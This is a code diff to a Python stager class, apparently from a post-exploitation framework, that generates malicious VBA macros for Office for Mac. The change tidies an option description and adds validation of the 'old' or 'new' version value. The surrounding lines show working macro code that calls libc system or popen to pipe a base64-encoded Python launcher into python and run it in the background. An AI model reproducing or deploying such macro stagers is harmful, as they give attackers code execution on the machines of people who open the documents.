@@ -47,7 +47,7 @@ class Stager:
                 'Value'         :   'default'
             },
             'Version' : {
-                'Description'   :   'Version of the Office. Old (Versions older than 15.26) will use system to execute the payload and New (Versions 15.26 and newer) will use popen to execute the payload. Defaults to new',
+                'Description'   :   'Version of Office for Mac. Accepts values "old" and "new". Old applies to versions of Office for Mac older than 15.26. New applies to versions of Office for Mac 15.26 and newer. Defaults to new.',
                 'Required'      :   True,
                 'Value'         :   'new'
             }
@@ -83,6 +83,11 @@ class Stager:
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
         version = self.options['Version']['Value']
+
+        try:
+            version = str(version).lower()
+        except TypeError:
+            raise TypeError('Invalid version provided. Accepts "new" and "old"')
 
         # generate the python launcher code
         pylauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="python", encode=True, userAgent=userAgent, safeChecks=safeChecks)
@@ -124,7 +129,7 @@ class Stager:
                             result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
                     #End If
         End Function""" %(payload)
-            else:
+            elif version == "new":
                 macro = """
         Private Declare PtrSafe Function system Lib "libc.dylib" Alias "popen" (ByVal command As String, ByVal mode As String) as LongPtr
         
@@ -148,5 +153,7 @@ class Stager:
                             result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &", "r")
                     #End If
         End Function""" % (payload)
+            else:
+                raise ValueError('Invalid version provided. Accepts "new" and "old"')
 
         return macro
